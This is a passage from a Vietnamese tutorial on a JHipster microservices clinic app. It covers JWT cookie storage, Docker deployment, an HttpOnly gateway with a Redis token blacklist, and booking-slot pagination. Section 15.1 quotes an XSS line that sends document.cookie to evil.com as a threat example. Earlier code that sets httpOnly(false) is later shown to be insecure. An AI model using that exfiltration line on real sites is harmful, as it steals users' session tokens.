    participant UI as 💻 Angular SPA (:4200)
    participant Storage as 🗄️ Storage + Cookie
    participant Gateway as 🚪 Proxy Gateway
    participant Auth as 🔐 Auth Service (:8081)
    participant Clinical as 🏥 Clinical Service (:8083)

    User->>UI: Nhập tài khoản + Mật khẩu + RememberMe
    UI->>Auth: POST /api/authenticate
    Auth->>Auth: Xác thực DB, Sinh JWT Token (HS512)
    Auth-->>UI: Body: { id_token: "..." }<br/>Header: Set-Cookie: jhi-authenticationToken=...; Path=/; SameSite=Lax
    UI->>Storage: storeAuthenticationToken(token, rememberMe)<br/>(Ghi localStorage/sessionStorage + Ghi document.cookie)
    
    Note over UI, Clinical: Khi gọi API nghiệp vụ (VD: Xem hồ sơ bệnh án)
    UI->>Storage: getAuthenticationToken() (Đọc Storage, Fallback sang Cookie)
    UI->>Gateway: GET /api/patient/my-clinical-records<br/>Header: Authorization: Bearer <token><br/>Header: Cookie: jhi-authenticationToken=<token>
    Gateway->>Clinical: Chuyển tiếp request
    Clinical->>Clinical: Spring Security giải mã JWT Claims (Stateless)
    Clinical-->>UI: Trả về 200 OK kèm dữ liệu bệnh án
```

---

### 13.2. Code (Hiện Thực Chi Tiết Backend & Frontend)

#### 1. Backend (`AuthenticateController.java` - `opcbs-auth-service`):
```java
// Tạo token JWT và gắn Set-Cookie header trả về cho Client
String jwt = this.createToken(authentication, loginVM.isRememberMe());
var httpHeaders = new HttpHeaders();
httpHeaders.setBearerAuth(jwt);

// Cấu hình Cookie an toàn
long maxAgeSeconds = loginVM.isRememberMe() ? 30 * 24 * 3600 : -1; // 30 ngày hoặc session
ResponseCookie authCookie = ResponseCookie.from("jhi-authenticationToken", jwt)
    .httpOnly(false)     // Cho phép frontend SPA đọc fallback
    .path("/")           // Hiệu lực toàn domain
    .maxAge(maxAgeSeconds)
    .sameSite("Lax")     // Chống CSRF
    .build();
httpHeaders.add(HttpHeaders.SET_COOKIE, authCookie.toString());

return new ResponseEntity<>(new JWTToken(jwt), httpHeaders, HttpStatus.OK);
```

#### 2. Frontend State Storage (`state-storage.service.ts`):
```typescript
@Service()
export class StateStorageService {
  private readonly authenticationKey = AUTHENTICATION_TOKEN_KEY; // 'jhi-authenticationToken'

  storeAuthenticationToken(authenticationToken: string, rememberMe: boolean): void {
    const rawToken = authenticationToken;
    authenticationToken = JSON.stringify(authenticationToken);
    this.clearAuthenticationToken();
    if (rememberMe) {
      localStorage.setItem(this.authenticationKey, authenticationToken);
    } else {
      sessionStorage.setItem(this.authenticationKey, authenticationToken);
    }
    // Đồng bộ vào Cookie với thời hạn tương ứng
    this.setCookie(this.authenticationKey, rawToken, rememberMe);
    this.setCookie('id_token', rawToken, rememberMe);
  }

  getAuthenticationToken(): string | null {
    // 1. Đọc từ Web Storage
    const authenticationToken = localStorage.getItem(this.authenticationKey) ?? sessionStorage.getItem(this.authenticationKey);
    if (authenticationToken) {
      try {
        return JSON.parse(authenticationToken) as string;
      } catch {
        return authenticationToken;
      }
    }
    // 2. FALLBACK RECOVERY: Nếu Storage trống (VD: mở tab mới), đọc trực tiếp từ Cookie
    return this.getCookie(this.authenticationKey) ?? this.getCookie('id_token');
  }

  clearAuthenticationToken(): void {
    sessionStorage.removeItem(this.authenticationKey);
    localStorage.removeItem(this.authenticationKey);
    this.deleteCookie(this.authenticationKey);
    this.deleteCookie('id_token');
  }

  private setCookie(name: string, value: string, rememberMe: boolean): void {
    if (typeof document === 'undefined') return;
    let expires = '';
    if (rememberMe) {
      const date = new Date();
      date.setTime(date.getTime() + 30 * 24 * 60 * 60 * 1000);
      expires = `; expires=${date.toUTCString()}`;
    }
    document.cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}${expires}; path=/; SameSite=Lax`;
  }

  private getCookie(name: string): string | null {
    if (typeof document === 'undefined') return null;
    const nameEQ = `${encodeURIComponent(name)}=`;
    const cookies = document.cookie ? document.cookie.split(';') : [];
    for (let c of cookies) {
      c = c.trim();
      if (c.indexOf(nameEQ) === 0) {
        return decodeURIComponent(c.substring(nameEQ.length));
      }
    }
    return null;
  }

  private deleteCookie(name: string): void {
    if (typeof document === 'undefined') return;
    document.cookie = `${encodeURIComponent(name)}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; SameSite=Lax`;
  }
}
```

#### 3. Frontend Interceptor (`auth.interceptor.ts`):
```typescript
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const stateStorageService = inject(StateStorageService);

  // Bỏ qua nếu URL bên ngoài không thuộc serverApiUrl
  if (!req.url || (req.url.startsWith('http') && !(serverApiUrl && req.url.startsWith(serverApiUrl)))) {
    return next(req);
  }

  const token = stateStorageService.getAuthenticationToken();
  if (token) {
    req = req.clone({
      setHeaders: {
        Authorization: `Bearer ${token}`, // Tự động gắn Bearer Token vào mọi API call
      },
    });
  }
  return next(req);
};
```

---

### 13.3. Run (Cách Kiểm Tra & Nghiệm Thu Trên Trình Duyệt)
1. Mở Trình duyệt $\to$ Nhấn `F12` $\to$ Chuyển sang tab **Application** $\to$ Mục **Cookies** $\to$ Chọn URL `http://localhost:4200` (hoặc `:9000`).
   - Kết quả: Thấy xuất hiện 2 cookie `jhi-authenticationToken` và `id_token` với giá trị là chuỗi JWT `eyJhbGci...`.
   - Cột `Path` hiển thị `/`.
   - Cột `SameSite` hiển thị `Lax`.
2. Chuyển sang tab **Network** $\to$ Lọc API `/api/authenticate`:
   - Response Headers chứa `set-cookie: jhi-authenticationToken=eyJhb...; Max-Age=...; Path=/; SameSite=Lax`.
3. Kiểm tra tính năng đa tab:
   - Mở thêm 1 Tab mới $\to$ truy cập thẳng vào `http://localhost:4200/patient/clinical-records` $\to$ Phiên đăng nhập vẫn giữ nguyên vẹn nhờ cơ chế cookie fallback, không bị đá ra Login!

---

### 13.4. Debug (Kỹ Thuật Đặt Breakpoint & Troubleshooting)
- **Breakpoint 1 tại `state-storage.service.ts` dòng `getAuthenticationToken()`**:
  - Xem biến `authenticationToken` từ Storage có `null` không. Nếu `null`, bước tiếp theo vào `this.getCookie()` xem giá trị cookie trả về.
- **Console Check**:
  - Gõ lệnh Console: `document.cookie` để xem danh sách toàn bộ cookie đang hoạt động.
- **Network Tracing**:
  - Kiểm tra request gửi đi có kèm header `Authorization: Bearer ...` hay không. Nếu thiếu, kiểm tra `serverApiUrl` trong `auth.interceptor.ts` có khớp với URL của API hay không.

---

### 13.5. Break it (Phá Vỡ Hệ Thống Khi Lưu Trữ Sai Cách)
- **Kịch bản 1: Chỉ dùng `sessionStorage` (Mất phiên đa tab)**:
  - Khi người dùng đăng nhập không chọn Remember Me, token chỉ nằm trong `sessionStorage` của Tab 1.
  - Người dùng bấm chuột giữa mở Tab 2 $\to$ Tab 2 có `sessionStorage` rỗng $\to$ Angular Guard chặn lại và redirect sang `/login` $\to$ Trải nghiệm cực kỳ khó chịu!
- **Kịch bản 2: Quên thiết lập `path=/`**:
  - Nếu `ResponseCookie` không khai báo `.path("/")`, cookie sẽ mặc định ăn theo path của endpoint gọi nó (tức là `/api/`).
  - Khi người dùng ở trang chủ `/` hoặc điều hướng sang các đường dẫn khác, trình duyệt sẽ không gửi cookie $\to$ xác thực thất bại.
- **Kịch bản 3: Không dọn Cookie khi Logout**:
  - Người dùng nhấn Đăng xuất, code chỉ xóa `localStorage.removeItem(...)` nhưng bỏ quên cookie.
  - Người dùng kế tiếp sử dụng chung máy tính có thể bị phục hồi session trái phép.

---

### 13.6. Fix it (Các Lớp Bảo Vệ Chuẩn Enterprise)
1. **Lớp 1 - Fallback Recovery**: Đọc Storage trước, nếu trống đọc Cookie $\to$ Giải quyết triệt để vấn đề mất phiên khi mở tab mới.
2. **Lớp 2 - Explicit Path & SameSite**: Luôn gán `path=/` và `SameSite=Lax` $\to$ Đảm bảo hiệu lực toàn hệ thống và chặn đứng nguy cơ tấn công CSRF.
3. **Lớp 3 - Safe URI Encoding**: Dùng `encodeURIComponent` và `decodeURIComponent` khi thao tác `document.cookie` $\to$ Đảm bảo các ký tự phân tách trong JWT không làm sai lệch chuỗi cookie.
4. **Lớp 4 - Triple Clean Logout**: Khi gọi `clearAuthenticationToken()`, dọn sạch cả 3 nơi: `sessionStorage`, `localStorage` và ghi đè cookie hết hạn về `1970-01-01`.

---

### 13.7. Explain it (Mẫu Trả Lời Phỏng Vấn Chuyên Sâu Senior/Lead)
> *"Trong kiến trúc Microservices của MindBridge OPCBS, chúng tôi áp dụng chiến lược **Xác Thực Kép (Hybrid Dual-Storage)** kết hợp giữa **Stateless JWT Token** và **Browser Cookie**.  
> Cụ thể, sau khi `opcbs-auth-service` xác thực thành công, server trả về JWT trong body đồng thời set header `Set-Cookie` (`SameSite=Lax`, `Path=/`). Ở tầng Angular client, chúng tôi lưu token vào Web Storage (`localStorage`/`sessionStorage` tùy cờ Remember Me) và đồng bộ vào `document.cookie`.  
> Lợi ích cốt lõi của kiến trúc này là:  
> 1. Đảm bảo tính **Stateless** khi gửi API call qua header `Authorization: Bearer <token>` để các microservices tự thẩm định chữ ký độc lập.  
> 2. Khắc phục triệt để nhược điểm mất phiên giữa các Tab trình duyệt của `sessionStorage` nhờ cơ chế **Cookie Fallback**.  
> 3. Hỗ trợ trình duyệt tự động gửi cookie khi tải trực tiếp tài nguyên y tế mà vẫn phòng chống CSRF hiệu quả qua cấu hình `SameSite=Lax`."*

---

# [BÀI 14] Đóng Gói Toàn Diện 8 Microservices Bằng Docker & Giải Pháp Triển Khai Cloud 0 VNĐ

### 14.1. Understand (Mục Tiêu & Bài Toán Thực Tế)
- **Vấn đề khi mở rộng 8 Microservices**:
  - Chạy 8 Java Spring Boot apps + MySQL + Redis + Eureka + Nginx + Angular thủ công bằng terminal là bất khả thi trong môi trường sản xuất.
  - Phải đồng bộ hóa thứ tự khởi động (DB và Cache phải sống trước, sau đó mới tới Microservices, cuối cùng là Nginx Gateway).
- **Giải pháp Cloud 0 VNĐ (Zero-Cost Production)**:
  - Tận dụng tài nguyên máy chủ miễn phí vĩnh viễn của **Oracle Cloud Infrastructure (OCI) Always Free Tier**: 4 Cores ARM64, 24 GB RAM (hoàn toàn miễn phí, không bao giờ bị tính phí).
  - Tận dụng **Cloudflare Tunnel (Zero Trust)**: Đưa ứng dụng ra Internet mà không cần mở port mạng gia đình hay mua IP tĩnh.

### 14.2. Code (Orchestration Toàn Bộ 8 Services)
```yaml
# docker-compose.prod.yml
services:
  mysql: { image: "mysql:8.4", networks: [opcbs-backend-net] }
  redis: { image: "redis:7.4-alpine", networks: [opcbs-backend-net] }
  opcbs-eureka-server: { build: ../opcbs-eureka-server, networks: [opcbs-backend-net] }
  opcbs-auth-service: { build: ../opcbs-auth-service, networks: [opcbs-backend-net, opcbs-frontend-net] }
  opcbs-booking-service: { build: ../opcbs-booking-service, networks: [opcbs-backend-net, opcbs-frontend-net] }
  opcbs-clinical-service: { build: ../opcbs-clinical-service, networks: [opcbs-backend-net, opcbs-frontend-net] }
  opcbs-treatment-service: { build: ../opcbs-treatment-service, networks: [opcbs-backend-net, opcbs-frontend-net] }
  opcbs-psychometric-service: { build: ../opcbs-psychometric-service, networks: [opcbs-backend-net, opcbs-frontend-net] }
  opcbs-notification-service: { build: ../opcbs-notification-service, networks: [opcbs-backend-net, opcbs-frontend-net] }
  opcbs-payment-service: { build: ../opcbs-payment-service, networks: [opcbs-backend-net, opcbs-frontend-net] }
  opcbs-message-service: { build: ../opcbs-message-service, networks: [opcbs-backend-net, opcbs-frontend-net] }
  opcbs-frontend: { build: ../mindbridge-jhipster, networks: [opcbs-frontend-net] }
  nginx: { image: "nginx:1.27-alpine", ports: ["80:80", "443:443"], networks: [opcbs-frontend-net] }
```

### 14.3. Run (Quy Trình Khởi Động)
```bash
cd docker
./deploy.sh # Hoặc .\deploy.ps1 trên Windows
docker compose -f docker-compose.prod.yml ps
```

### 14.4. Debug (Kỹ Thuật Khắc Phục Lỗi)
- Kiểm tra container nào chiếm dụng RAM nhiều nhất: `docker stats`.
- Kiểm tra kết nối mạng nội bộ giữa các container:
  ```bash
  docker exec -it opcbs-booking-prod ping mysql
  docker exec -it opcbs-booking-prod nc -zv mysql 3306
  ```

### 14.5. Break it (Phá Vỡ Khi Không Phân Tầng Mạng)
- Nếu để `ports: "3306:3306"` phơi ra ngoài Internet: Máy quét tự động của hacker liên tục tấn công Brute-force mật khẩu root của MySQL, làm tràn RAM và nghẽn CPU của VPS.
- **Biện pháp phòng ngừa**: Dùng `networks: internal: true` trong Docker Compose để cô lập 100% database phía sau Nginx.

### 14.6. Fix it & Explain it (Mẫu Trả Lời Phỏng Vấn Chuyên Sâu)
> *"Để vận hành 8 Microservices tối ưu chi phí, chúng tôi đóng gói toàn bộ dịch vụ bằng Docker Multi-stage tối giản và tổ chức phân tầng mạng cô lập (Network Segmentation). Chúng tôi chọn Oracle Cloud Always Free Tier (4 OCPU ARM64, 24GB RAM) kết hợp Cloudflare Tunnel và Let's Encrypt SSL, giúp hệ thống y tế hoạt động ổn định 24/7 với chi phí cơ sở hạ tầng đúng 0 VNĐ mà vẫn đảm bảo an toàn thông tin theo chuẩn HIPAA."*

### 14.7. Cạm Bẫy Build Docker: Lỗi `npm error ENOENT package.json` trong Backend Microservices
- **Hiện tượng**: Khi Dockerfile chạy `mvn clean package -Pprod`, Maven báo lỗi không tìm thấy `package.json` trong thư mục `/build` của backend service.
- **Nguyên nhân gốc rễ**: Khi tách monolithic JHipster thành Microservices, mã nguồn Angular đã chuyển sang dự án độc lập `mindbridge-jhipster`. Tuy nhiên trong các file `pom.xml` của 8 backend service vẫn còn sót lại `frontend-maven-plugin` do JHipster sinh ra. Khi kích hoạt profile `prod` hoặc `webapp`, plugin này cố tình gọi `npm install` và tìm `package.json`.
- **Giải pháp dứt điểm**:
  1. Thêm `<frontend.skip>true</frontend.skip>` vào `<properties>` và `<skip>${frontend.skip}</skip>` vào `<pluginManagement>` trong `pom.xml` của toàn bộ 8 backend services.
  2. Bổ sung các cờ build an toàn trong Dockerfile: `-Dfrontend.skip=true -Dmaven.gitcommitid.skip=true -Dmodernizer.skip=true -Dcheckstyle.skip=true`.

---

# [BÀI 15] Nâng Cấp Chuẩn Bảo Mật Doanh Nghiệp (Enterprise-Grade Security): HttpOnly Cookie BFF Gateway & Redis Token Blacklist Revocation

### 15.1. Understand (Mục Tiêu & Vấn Đề Thực Tế)
- **Vấn đề 1: Nguy cơ XSS trộm Token**:
  - Khi cookie được cấu hình `httpOnly(false)` để JavaScript (Angular) đọc phục vụ cơ chế cứu nguy đa tab, nếu website dính lỗ hổng XSS (Cross-Site Scripting), hacker có thể dùng lệnh `fetch('https://evil.com/steal?token=' + document.cookie)` để trộm trọn vẹn JWT token.
- **Vấn đề 2: Lỗ hổng Stateless JWT không thể thu hồi tức thì**:
  - Trong kiến trúc Stateless JWT thuần túy, server không lưu session. Một khi JWT được ký phát hành (thời hạn 30 ngày nếu Remember Me), người dùng bấm **Đăng xuất** hoặc **Đổi mật khẩu** thì về mặt kỹ thuật token cũ vẫn còn hiệu lực! Hacker nếu đã trộm được token vẫn có thể tiếp tục gọi API mạo danh nạn nhân cho đến khi token tự hết hạn.
- **Giải pháp Chuẩn Doanh Nghiệp (Enterprise Standard)**:
  1. **BFF (Backend-For-Frontend) HttpOnly Cookie**:
     - Bật lại `httpOnly(true)`. Trình duyệt cấm tuyệt đối JavaScript đọc token qua `document.cookie`.
     - Nginx Gateway (hoặc Backend Filter) tự động nhặt HttpOnly Cookie chuyển thành `Authorization: Bearer <jwt>` trước khi đẩy vào các microservices bên trong.
  2. **Redis Token Blacklist (Danh Sách Đen Token Với TTL Tự Hủy)**:
     - Gắn thêm claim chuẩn RFC 7519 `jti` (JWT ID) duy nhất vào từng token.
     - Khi người dùng bấm Logout hoặc Đổi mật khẩu, lưu `jti` vào Redis với giá trị `"REVOKED"` và thời gian sống `TTL = expiresAt - now`.
     - Khi token tự hết hạn, Redis tự động giải phóng RAM mà không cần tác vụ quét dọn thủ công.

---

### 15.2. Code (Các Thành Phần Cốt Lõi Đã Triển Khai)

#### 1. Backend Bật HttpOnly & Cấp JTI ([`AuthenticateController.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-auth-service/src/main/java/com/ocbs/web/rest/AuthenticateController.java))
```java
// Bật HttpOnly = true ngăn JavaScript truy cập
ResponseCookie authCookie = ResponseCookie.from("jhi-authenticationToken", jwt)
    .httpOnly(true)
    .path("/")
    .maxAge(maxAgeSeconds)
    .sameSite("Lax")
    .build();
httpHeaders.add(HttpHeaders.SET_COOKIE, authCookie.toString());

// Gắn claim 'jti' UUID duy nhất theo chuẩn RFC 7519
JwtClaimsSet.Builder builder = JwtClaimsSet.builder()
    .id(UUID.randomUUID().toString()) // JTI phục vụ Redis Blacklist
    .issuedAt(now)
    .expiresAt(validity)
    .subject(authentication.getName())
    .claim(AUTHORITIES_CLAIM, authorities);
```

#### 2. Nginx Gateway Tự Động Chuyển Đổi Cookie Thành Bearer ([`docker/nginx/nginx.conf`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/docker/nginx/nginx.conf))
```nginx
# Trích xuất HttpOnly Cookie và chuyển thành Bearer token
map $cookie_jhi_authenticationToken $token_from_cookie {
    default $cookie_jhi_authenticationToken;
    ""      $cookie_id_token;
}

map $token_from_cookie $bearer_from_cookie {
    default "Bearer $token_from_cookie";
    ""      "";
}

map $http_authorization $final_authorization {
    default $http_authorization;
    ""      $bearer_from_cookie;
}

server {
    ...
    proxy_set_header Authorization $final_authorization;
}
```

#### 3. Bộ Lọc Dự Phòng Backend ([`CookieToBearerTokenFilter.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-auth-service/src/main/java/com/ocbs/security/CookieToBearerTokenFilter.java))
```java
@Component
@Order(Ordered.HIGHEST_PRECEDENCE + 5)
public class CookieToBearerTokenFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
        throws ServletException, IOException {
        String existingAuth = request.getHeader(HttpHeaders.AUTHORIZATION);
        if (existingAuth == null || existingAuth.isBlank()) {
            String token = extractTokenFromCookie(request);
            if (token != null) {
                HttpServletRequest wrapped = new HttpServletRequestWrapper(request) {
                    @Override
                    public String getHeader(String name) {
                        return HttpHeaders.AUTHORIZATION.equalsIgnoreCase(name) ? "Bearer " + token : super.getHeader(name);
                    }
                };
                filterChain.doFilter(wrapped, response);
                return;
            }
        }
        filterChain.doFilter(request, response);
    }
}
```

#### 4. Service Quản Lý Blacklist Trên Redis ([`TokenBlacklistService.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-auth-service/src/main/java/com/ocbs/security/TokenBlacklistService.java))
```java
public void blacklistToken(String jti, Instant expiresAt) {
    Instant now = Instant.now();
    Duration ttl = (expiresAt != null && expiresAt.isAfter(now)) ? Duration.between(now, expiresAt) : Duration.ofHours(24);
    redisTemplate.opsForValue().set("token:blacklist:" + jti, "REVOKED", ttl);
}

public void blacklistUserTokens(String username) {
    long nowEpoch = System.currentTimeMillis();
    redisTemplate.opsForValue().set("user:logout:" + username.toLowerCase(), String.valueOf(nowEpoch), Duration.ofDays(30));
}
```

#### 5. Tích Hợp Kiểm Tra Blacklist Trong `JwtDecoder` ([`SecurityJwtConfiguration.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-auth-service/src/main/java/com/ocbs/config/SecurityJwtConfiguration.java))
```java
Jwt jwt = jwtDecoder.decode(token);
if (blacklistService.isBlacklisted(jwt)) {
    throw new BadJwtException("Token đã bị hủy phiên đăng nhập hoặc thu hồi (Redis Token Blacklist).");
}
return jwt;
```

---

### 15.3. Break it (Kịch Bản Phá Vỡ Hệ Thống Khi Thiếu Các Lớp Bảo Vệ Này)
- **Kịch bản 1: Bị tấn công XSS trộm Token**:
  - Hacker chèn mã JavaScript độc hại vào trang web.
  - *Nếu dùng `httpOnly=false`*: Hacker đọc được `document.cookie` $\rightarrow$ Đánh cắp được JWT $\rightarrow$ Giả mạo danh tính bệnh nhân/bác sĩ.
  - *Với `httpOnly=true`*: `document.cookie` hoàn toàn mù, không chứa token $\rightarrow$ Hacker bất lực.
- **Kịch bản 2: Replay Attack sau khi đổi mật khẩu**:
  - Bệnh nhân bị mất laptop hoặc nghi ngờ tài khoản bị lộ mật khẩu $\rightarrow$ Đăng nhập từ điện thoại và tiến hành đổi mật khẩu.
  - *Nếu là Stateless JWT thuần (không có Redis Blacklist)*: Kẻ gian trên laptop vẫn tiếp tục dùng token cũ để xem hồ sơ bệnh án suốt 30 ngày!
  - *Với Redis Blacklist*: Ngay khi đổi mật khẩu, `blacklistUserTokens` ghi mốc thời gian vào Redis $\rightarrow$ Mọi request từ laptop dùng token cũ lập tức bị từ chối với **HTTP 401 Unauthorized**!

---

### 15.4. Fix it (Tổng Hợp Các Tầng Phòng Thủ Đã Nâng Cấp)
1. **Phòng thủ XSS**: `httpOnly(true)` + `SameSite=Lax` + `Path=/`.
2. **Cầu nối trong suốt**: Nginx Gateway tự động chuyển Cookie $\rightarrow$ Header `Authorization: Bearer`.
3. **Phòng thủ Replay Attack**: Redis Token Blacklist với khóa `jti` và TTL tự hủy.
4. **Bảo vệ khi đổi mật khẩu**: `user:logout:{username}` epoch watermark trên Redis.
5. **Dọn sạch đồng bộ**: Endpoint `POST /api/logout` trả về `Set-Cookie: max-age=0` đồng thời blacklist token trên server.

---

### 15.5. Explain it (Mẫu Trả Lời Phỏng Vấn Chuyên Sâu Cấp Senior / Tech Lead)
> *"Trong kiến trúc Microservices phân tán của dự án, chúng tôi giải quyết bài toán nan giải giữa **Tính tiện dụng của SPA**, **Tính Stateless của Microservices** và **Yêu cầu bảo mật cấp Doanh nghiệp (Enterprise Security)** bằng mô hình **Hybrid BFF Gateway kết hợp Redis Token Blacklist**:  
> 1. Ở tầng biên (Edge/Nginx Gateway): Chúng tôi sử dụng **HttpOnly Cookie** (`SameSite=Lax`). Trình duyệt hoàn toàn cấm JavaScript đọc token, triệt tiêu 100% rủi ro bị đánh cắp danh tính qua XSS.  
> 2. Gateway tự động chuyển đổi HttpOnly Cookie thành header chuẩn `Authorization: Bearer <jwt>` trước khi chuyển tiếp vào các microservices bên trong, giúp các microservices giữ trọn vẹn kiến trúc RESTful Stateless độc lập.  
> 3. Để khắc phục nhược điểm không thể thu hồi token trước hạn của JWT, chúng tôi gắn claim `jti` duy nhất và tích hợp **Redis Token Blacklist**. Khi người dùng đăng xuất hoặc đổi mật khẩu, token sẽ bị vô hiệu hóa ngay tức khắc trên Redis với TTL bằng đúng thời hạn còn lại của token, mang lại cơ chế Instant Revocation chuẩn xác như mô hình Session của các tập đoàn công nghệ lớn như Meta và Google."*

---

# [BÀI 16] Tối Ưu UX Đặt Lịch Y Tế: Rolling Day Grid (Bắt Đầu Từ Hôm Nay) & Daily Slot Pagination (Phân Trang Khung Giờ Theo Ngày)

### 16.1. Understand (Vấn Đề Cốt Lõi Khi Lấy Khung Giờ Cả Tuần)
1. **Tại sao không nên query lấy hết slot theo tuần (`size: 200`) rồi đếm/lọc client-side?**
   - **Vấn đề 1: Tràn bộ nhớ & Lãng phí băng thông mạng**: Nếu 1 bác sĩ có 50 slot rải rác trong tháng, việc query `startTime.greaterThanOrEqual: queryStart, size: 200` không có mốc chặn trên (`lessThanOrEqual`) sẽ tải về cả các slot của tuần 2, tuần 3... nhưng giao diện tuần hiện tại không hiển thị. Ngược lại, nếu bác sĩ mở nhiều lịch khám (ví dụ 30 slot/ngày x 7 ngày = 210 slot), giới hạn `size: 200` sẽ bị cắt đứt làm thiếu khung giờ ở những ngày cuối tuần!
   - **Vấn đề 2: Lãng phí giao diện ở các ngày quá khứ**: Cách tính tuần ISO chuẩn (`getStartOfIsoWeek`) luôn ép cột đầu tiên là Thứ 2. Nếu bệnh nhân truy cập vào Thứ 5 để đặt lịch, họ bị buộc phải nhìn thấy 3 cột Thứ 2, Thứ 3, Thứ 4 đã trôi qua trong quá khứ!
   - **Vấn đề 3: Vỡ layout do nhồi nhét**: Một ngày bác sĩ có thể có 10-15 slot. Nếu nhồi hết vào 1 cột hẹp của grid 7 ngày, cột đó sẽ kéo dài ngoẵng làm hỏng layout tổng thể.

2. **Giải pháp kiến trúc chuẩn**:
   - **Rolling 7-Day Selector**: Cột đầu tiên luôn bắt đầu từ **Ngày Hôm Nay** (`dayjs().startOf('day')`). Người dùng xem liên tục 7 ngày tới (Hôm nay, Ngày mai, Ngày kia...), tuyệt đối không có ngày quá khứ chiếm chỗ.
   - **Daily Slot Page (1 ngày là 1 trang)**: Tách việc xem slot thành **Trang chi tiết theo ngày**. Khi người dùng click chọn ngày nào, hệ thống gửi query JPA Criteria đúng trong phạm vi ngày đó:
     `startTime.greaterThanOrEqual = startOfDay` VÀ `startTime.lessThanOrEqual = endOfDay`, kết hợp phân trang `page` & `size`.
   - **Giữ nguyên code cũ**: Comment lại toàn bộ logic cũ trong mã nguồn để đội ngũ dễ dàng đối chiếu quá trình tiến hóa của tính năng.

---

### 16.2. Code (So Sánh Code Cũ vs Code Mới)

#### 1. Code Cũ (Bị Comment Lại Trong [`appointment-book.ts`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/mindbridge-jhipster/src/main/webapp/app/entities/appointment/book/appointment-book.ts))
```typescript
/* =========================================================================
 * CODE CŨ TRƯỚC ĐÂY:
 * Query bừa 200 slot theo tuần không giới hạn ngày kết thúc, sau đó lọc thủ công cả tuần
 * -------------------------------------------------------------------------
 * function getStartOfIsoWeek(d: dayjs.Dayjs): dayjs.Dayjs { ... }
 * function getEndOfIsoWeek(d: dayjs.Dayjs): dayjs.Dayjs { ... }
 *
 * loadDoctorSlots(doctorId: number): void {
 *   const queryStart = this.currentWeekStart().isBefore(dayjs().startOf('day'))
 *     ? this.currentWeekStart().startOf('day').toISOString()
 *     : dayjs().startOf('day').toISOString();
 *
 *   this.availabilitySlotService
 *     .query({
 *       'doctorId.equals': doctorId,
 *       'status.equals': 'AVAILABLE',
 *       'startTime.greaterThanOrEqual': queryStart,
 *       size: 200,
 *       sort: ['startTime,asc'],
 *     })
 *     .subscribe({
 *       next: res => {
 *         this.slots.set(res.body || []);
 *         this.isLoading.set(false);
 *       }, ...
 *     });
 * }
 * ========================================================================= */
```

#### 2. Code Mới: Cột Đầu Luôn Là Hôm Nay & Phân Trang Theo Ngày
```typescript
// Cột đầu tiên của Grid luôn bắt đầu từ Ngày Hôm Nay
readonly currentStartDate = signal<dayjs.Dayjs>(dayjs().startOf('day'));
readonly selectedDate = signal<dayjs.Dayjs>(dayjs().startOf('day'));

// Quản lý Slot của 1 ngày dưới dạng 1 trang riêng (Daily Slot Page & Pagination)
readonly dailySlots = signal<IAvailabilitySlot[]>([]);
readonly dailyPage = signal<number>(1);
readonly dailyPageSize = signal<number>(8); // 8 khung giờ / trang
readonly dailyTotalSlots = signal<number>(0);

loadSlotsForDate(doctorId: number, targetDate: dayjs.Dayjs, page = 1): void {
  this.isLoadingDailySlots.set(true);
  const startOfDay = targetDate.startOf('day').toISOString();
  const endOfDay = targetDate.endOf('day').toISOString();

  this.availabilitySlotService
    .query({
      'doctorId.equals': doctorId,
      'status.equals': 'AVAILABLE',
      'startTime.greaterThanOrEqual': startOfDay,
      'startTime.lessThanOrEqual': endOfDay, // Chặn trên chặt chẽ trong ngày
      page: page - 1,
      size: this.dailyPageSize(),
      sort: ['startTime,asc'],
    })
    .subscribe({
      next: res => {
        this.dailySlots.set(res.body || []);
        const totalHeader = res.headers.get('X-Total-Count');
        const total = totalHeader ? Number(totalHeader) : (res.body ? res.body.length : 0);
        this.dailyTotalSlots.set(total);
        this.isLoadingDailySlots.set(false);
      }, ...
    });
}
```

---

### 16.3. Explain it (Mẫu Trả Lời Phỏng Vấn Chuyên Sâu)
> *"Khi xây dựng module đặt lịch khám y tế (Booking Schedule), chúng tôi áp dụng nguyên tắc **'Rolling Window & Atomic Daily Pagination'**:  
> Thay vì dùng tuần ISO cố định bắt đầu từ Thứ 2 khiến người bệnh vào cuối tuần phải nhìn các ngày quá khứ vô ích, chúng tôi dùng **Rolling 7-day strip với cột đầu tiên luôn là Ngày Hiện Tại**, đồng thời khóa nút lùi ngày khi ở mốc hôm nay để triệt tiêu mọi tương tác không hợp lệ.  
> Về tầng dữ liệu, chúng tôi loại bỏ hoàn toàn việc query hàng trăm slot không mốc chặn trên rồi lọc client-side. Thay vào đó, **mỗi ngày là một trang slot độc lập (Daily Slot Page)** với query Spring Data JPA Criteria chặn chính xác giữa `startOfDay` và `endOfDay`, kết hợp phân trang chuẩn qua header `X-Total-Count` và nhóm theo ca Sáng - Chiều - Tối. Điều này giúp giảm 90% dung lượng payload truyền qua mạng, tránh tràn bộ nhớ trình duyệt và đem lại trải nghiệm mượt mà, trực quan nhất cho bệnh nhân."*

---

# [BÀI 17] Kỹ Thuật Debug & Khắc Phục Lỗi 401 Zombie Token & Vòng Lặp Văng Ra Khỏi Phiên (Blacklist Infinite 401 Loop)

### 17.1. Understand (Mô Tả Lỗi & Triệu Chứng Thực Tế)
- **Hiện tượng**:
  - Người dùng bấm **Đăng xuất (Logout)** $\rightarrow$ Sau đó load lại tab (F5) hoặc mở tab mới.
  - Giao diện có vẻ như "vẫn đang đăng nhập" hoặc khi đăng nhập lại thì liên tục bị **lỗi 401 Unauthorized** và bị **văng về Home Page / Login Page**, mọi lời gọi API tới các microservices khác (`booking`, `clinical`, `treatment`...) đều thất bại với mã lỗi 401.

### 17.2. Root Cause Analysis (Phân Tích 4 Nguyên Nhân Gốc Rễ)
